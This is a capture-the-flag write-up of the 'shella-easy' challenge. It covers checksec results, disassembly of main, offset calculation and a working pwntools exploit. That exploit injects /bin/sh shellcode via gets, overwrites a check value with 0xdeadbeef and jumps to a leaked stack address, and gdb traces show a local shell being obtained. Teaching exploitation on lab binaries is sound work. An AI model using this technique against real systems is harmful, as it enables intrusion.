# Tu18 Shella Easy

First we'll check the security of the binary: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Shellaeasy$ file shella-easy && checksec ./shella-easy
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
[*] '/home/root-at-iyn/Nightmare/BufferOverflow/ShellCode/Shellaeasy/shella-easy'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
Looking at the lack of protections we can see why it was challed shella easy :). We have a 32-bit binary with an executable stack and no PIE or Canary. When we run the binary we see the following:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Shellaeasy$ ./shella-easy
Yeah I'll have a 0xffce1d70 with a side of fries thanks
A
```

It looks like `0xffce1d70` could be an address. When the binary is run a second time we can see the address change, which means the binary has been compiled with ASLR: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Shellaeasy$ ./shella-easy
Yeah I'll have a 0xff9952c0 with a side of fries thanks
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Lets take a look at the disassembly for main: 

```asm
080484db <main>:
 80484db:	55                   	push   ebp
 80484dc:	89 e5                	mov    ebp,esp
 80484de:	53                   	push   ebx
 80484df:	83 ec 44             	sub    esp,0x44
 80484e2:	e8 29 ff ff ff       	call   8048410 <__x86.get_pc_thunk.bx>
 80484e7:	81 c3 19 1b 00 00    	add    ebx,0x1b19
 80484ed:	8b 83 fc ff ff ff    	mov    eax,DWORD PTR [ebx-0x4]
 80484f3:	8b 00                	mov    eax,DWORD PTR [eax]
 80484f5:	6a 14                	push   0x14
 80484f7:	6a 02                	push   0x2
 80484f9:	6a 00                	push   0x0
 80484fb:	50                   	push   eax
 80484fc:	e8 bf fe ff ff       	call   80483c0 <setvbuf@plt>
 8048501:	83 c4 10             	add    esp,0x10
 8048504:	8b 83 f8 ff ff ff    	mov    eax,DWORD PTR [ebx-0x8]
 804850a:	8b 00                	mov    eax,DWORD PTR [eax]
 804850c:	6a 14                	push   0x14
 804850e:	6a 02                	push   0x2
 8048510:	6a 00                	push   0x0
 8048512:	50                   	push   eax
 8048513:	e8 a8 fe ff ff       	call   80483c0 <setvbuf@plt>
 8048518:	83 c4 10             	add    esp,0x10
 804851b:	c7 45 f8 be ba fe ca 	mov    DWORD PTR [ebp-0x8],0xcafebabe
 8048522:	8d 45 b8             	lea    eax,[ebp-0x48]
 8048525:	50                   	push   eax
 8048526:	8d 83 e0 e5 ff ff    	lea    eax,[ebx-0x1a20]
 804852c:	50                   	push   eax
 804852d:	e8 4e fe ff ff       	call   8048380 <printf@plt>
 8048532:	83 c4 08             	add    esp,0x8
 8048535:	8d 45 b8             	lea    eax,[ebp-0x48]
 8048538:	50                   	push   eax
 8048539:	e8 52 fe ff ff       	call   8048390 <gets@plt>
 804853e:	83 c4 04             	add    esp,0x4
 8048541:	81 7d f8 ef be ad de 	cmp    DWORD PTR [ebp-0x8],0xdeadbeef
 8048548:	74 07                	je     8048551 <main+0x76>
 804854a:	6a 00                	push   0x0
 804854c:	e8 4f fe ff ff       	call   80483a0 <exit@plt>
 8048551:	b8 00 00 00 00       	mov    eax,0x0
 8048556:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 8048559:	c9                   	leave
 804855a:	c3                   	ret
 804855b:	66 90                	xchg   ax,ax
 804855d:	66 90                	xchg   ax,ax
 804855f:	90                   	nop
```

In main we see: 
- Two calls to made to setvbuf which uses ebx-0x4 and ebx-0x8 as buffers. This is likely used for STDIN and STDOUT. 
- After this we see the value `0xcafebabe` moved into ebp-0x8
- There is a call to printf with `ebp-0x48` and `ebx-0x1a20` as arguments. 
- Next we see `ebp-0x48` passed to `gets` as an argument. This is likely our buffer and point of entry to the program. 
- After the call to gets there is a conditional instruction. A comparison is made between `ebp-0x8` and `0xdeadbeef`, if its equal the program jumps to `8048551` and will execute the return instruction. If its not equal, the program exits. 

So from what we can see, the buffer that points to gets is vulnerable to a buffer overflow. Our input starts at `ebp-0x48` so we can expect after sending 72 bytes we will be at ebp, another 4 bytes will overwrite ebp, which should bring us to the return address which is another 4 bytes. However, we also need to remember the comparison between `ebp-0x8` and `0xdeadbeef`. That means we'll have to send 0x40 (64) bytes to get to ebp-0x8, then add 4 bytes for the `0xdeadbeef` value. The start of our 64 bytes will be the shellcode followed by A's (until 64 bytes is reached), then 0xdeadbeef , then 8 B's, and the return address (4 bytes). At this point we have enough to start building an exploit. We'll make a POC with python and debug it in gdb: 


```python
import re
from pwn import *

target = process("./shella-easy")

# gdb.attach(target, gdbscript="b *main")

# Stack leak
message = target.recvline()
m = re.search(r'(?=0).+(?=with)', message.decode('utf-8'))
rbp_0x48 = int(m.group(0).rstrip(), 16)

# Payload
shellcode = asm(shellcraft.i386.linux.sh())
payload = shellcode + b"A" * (0x40 - len(shellcode)) + p32(0xdeadbeef) + b"B" * 8 + p32(rbp_0x48)

target.sendline(payload)

target.interactive()
```


Running the exploit script and inspecting the breakpoint in gdb, we see we have successfully placed `0xdeadbeef` in rbp-0x8 and have overwritten the return address with `0xffa80c30` the start our shellcode:

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffa80c30  →  0x2f68686a ("jhh/"?)
$ebx   : 0x0804a000  →  0x08049f0c  →  <_DYNAMIC+0000> add DWORD PTR [eax], eax
$ecx   : 0xee9ec9c0  →  0x00000000
$edx   : 0x1
$esp   : 0xffa80c2c  →  0xffa80c30  →  0x2f68686a ("jhh/"?)
$ebp   : 0xffa80c78  →  0x42424242 ("BBBB"?)
$esi   : 0xffa80d34  →  0xffa813f2  →  "./shella-easy"
$edi   : 0xeea46b80  →  0x00000000
$eip   : 0x0804853e  →  <main+0063> add esp, 0x4
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────── stack ────
0xffa80c2c│+0x0000: 0xffa80c30  →  0x2f68686a	 ← $esp
0xffa80c30│+0x0004: 0x2f68686a
0xffa80c34│+0x0008: 0x68732f2f
0xffa80c38│+0x000c: 0x6e69622f
0xffa80c3c│+0x0010: 0x0168e389
0xffa80c40│+0x0014: 0x81010101
0xffa80c44│+0x0018: 0x69722434
0xffa80c48│+0x001c: 0xc9310101
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048535 <main+005a>      lea    eax, [ebp-0x48]
    0x8048538 <main+005d>      push   eax
    0x8048539 <main+005e>      call   0x8048390 <gets@plt>
 →  0x804853e <main+0063>      add    esp, 0x4
    0x8048541 <main+0066>      cmp    DWORD PTR [ebp-0x8], 0xdeadbeef
    0x8048548 <main+006d>      je     0x8048551 <main+118>
    0x804854a <main+006f>      push   0x0
    0x804854c <main+0071>      call   0x80483a0 <exit@plt>
    0x8048551 <main+0076>      mov    eax, 0x0
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "shella-easy", stopped 0x804853e in main (), reason: TEMPORARY BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804853e → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  x/24wx $esp
0xffa80c2c:	0xffa80c30	0x2f68686a	0x68732f2f	0x6e69622f
0xffa80c3c:	0x0168e389	0x81010101	0x69722434	0xc9310101
0xffa80c4c:	0x59046a51	0x8951e101	0x6ad231e1	0x80cd580b
0xffa80c5c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffa80c6c:	0x41414141	0xdeadbeef	0x42424242	0x42424242
0xffa80c7c:	0xffa80c30	0x00000000	0xffa80d34	0xffa80d3c
gef➤  info frame
Stack level 0, frame at 0xffa80c80:
 eip = 0x804853e in main; saved eip = 0xffa80c30
 Arglist at 0xffa80c78, args:
 Locals at 0xffa80c78, Previous frame's sp is 0xffa80c80
 Saved registers:
  ebx at 0xffa80c74, ebp at 0xffa80c78, eip at 0xffa80c7c
gef➤  x/a $ebp-0x8
0xffa80c70:	0xdeadbeef
```

If you continue stepping through the instructions you'll see execution is moved to the shellcode. Following the execution of shellcode on the stack we get to the system call `int 80` which will be called with `/bin/sh`. After this is executed we have shell access:

```bash
───────────────────────────────────────────────────────────────────── stack ────
0xffa80c68│+0x0000: 0xffa80c70  →  0x00006873 ("sh"?)	 ← $esp
0xffa80c6c│+0x0004: 0x00000000
0xffa80c70│+0x0008: 0x00006873 ("sh"?)
0xffa80c74│+0x000c: "/bin///sh"
0xffa80c78│+0x0010: "///sh"
0xffa80c7c│+0x0014: 0x00000068 ("h"?)
0xffa80c80│+0x0018: 0x00000000
0xffa80c84│+0x001c: 0xffa80d34  →  0xffa813f2  →  "./shella-easy"
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0xffa80c55                  xor    edx, edx
   0xffa80c57                  push   0xb
   0xffa80c59                  pop    eax
 → 0xffa80c5a                  int    0x80
   0xffa80c5c                  inc    ecx
   0xffa80c5d                  inc    ecx
   0xffa80c5e                  inc    ecx
   0xffa80c5f                  inc    ecx
   0xffa80c60                  inc    ecx
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "shella-easy", stopped 0xffa80c5a in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0xffa80c5a → int 0x80
────────────────────────────────────────────────────────────────────────────────
gef➤  nexti
process 38099 is executing new program: /usr/bin/dash
```

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Shellaeasy$ python3 exploit_shellaeasy.py 
[+] Starting local process './shella-easy': pid 38099
[*] running in new terminal: ['/usr/bin/gdb', '-q', './shella-easy', '-p', '38099', '-x', '/tmp/pwnlib-gdbscript-h9tkkovu.gdb']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
$ id
uid=1000(root-at-iyn) gid=1000(root-at-iyn) groups=1000(root-at-iyn),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
```

